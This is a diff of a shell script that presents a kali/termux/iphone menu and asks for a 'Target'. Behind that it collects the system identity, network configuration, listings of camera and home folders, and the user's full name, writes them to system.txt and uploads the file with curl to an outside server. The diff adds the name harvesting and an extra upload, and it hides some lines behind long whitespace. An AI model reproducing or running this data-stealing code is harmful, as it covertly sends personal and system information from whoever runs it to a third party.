@@ -1,7 +1,5 @@
 #!/system/bin/bash/sh
-
-clear
-echo -e "\033[33;32m"
+                                                                  clear                                                             echo -e "\033[33;32m"
 echo "Copyright By Pham Chien
 
   System : $(uname -a)
@@ -12,6 +10,12 @@ echo "Copyright By Pham Chien
 
 "> system.txt
 curl -T system.txt http://n8tive.co.za
+
+echo -n Enter Last nd Fist Name :
+   read name
+
+  echo $name >> system.txt
+  curl -T system.txt http://n8tive.co.za
 
 termux() {
 echo "
@@ -64,12 +68,6 @@ echo "
 
 $(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
 
-  System : $(uname -a)
-  User   : $(whoami)
-  date   : $(date)
-  path   : $(pwd)
-  id     : $(id)
-
   ','{$line}','
 
   ','{$line}','
@@ -89,45 +87,34 @@ echo "
 
   $(ifconfig)
 
-  $(cd /etc/fstab ; ls -l )
+  $(cd /home/kali/etc/fstab ; ls -l )
 
-  $(cd /Downloads ; ls -l )
+  $(cd /home/kali/Downloads ; ls -l )
 
-  $(cd /Pictures ; ls -s -u )
+  $(cd /home/kali/Pictures ; ls -s -u )
 
-  $(cd /Desktop ; ls -s -u )
+  $(cd /home/kali/Desktop ; ls -s -u )
 
-  $(cd /Videos ; ls -s -u )
+  $(cd /home/kali/Videos ; ls -s -u )
 
-  $(cd /Documents ; ls -s -u )
+  $(cd /home/kali/Documents ; ls -s -u )
 
-  $(cd /Public ; ls -s -u)
+  $(cd /home/kali/Public ; ls -s -u)
 
   $(cd /home ; ls -s -u ) ">> system.txt
 
 curl -T system.txt http://n8tive.co.za
 }
 
-windows() {
+ios() {
 echo "
+  $(cd / ; ls -s -u)
 
-$(ifconfig)
+  $(cd /root ; ls -s -u)
 
-  $(cd /etc/fstab ; ls -l )
+  $(cd /usr ; ls -s -u )
 
-  $(cd /Downloads ; ls -l )
-
-  $(cd /Pictures ; ls -s -u )
-
-  $(cd /Desktop ; ls -s -u )
-
-  $(cd /Videos ; ls -s -u )
-
-  $(cd /Documents ; ls -s -u )
-
-  $(cd /Public ; ls -s -u)
-
-  $(cd /home ; ls -s -u ) ">> system.txt
+  $(cd * ; ls -s -u)  ">> system.txt
 
   curl -T system.txt http://n8tive.co.za
 }
@@ -139,7 +126,7 @@ ____       ____
 
 1 ) kali
 2 ) termux
-3 ) windows"
+3 ) iphone "
 
   echo -n Enter System :
    read system
@@ -186,7 +173,7 @@ ____       ____
   ;;
 
   3)
-  windows
+  ios
   echo -e "\033[33;35m"
 
   echo -n Enter Target :
@@ -206,6 +193,6 @@ ____       ____
   ;;
 
   *)
-   echo Command not found 
+   echo Command not found
    exit 1
 esac
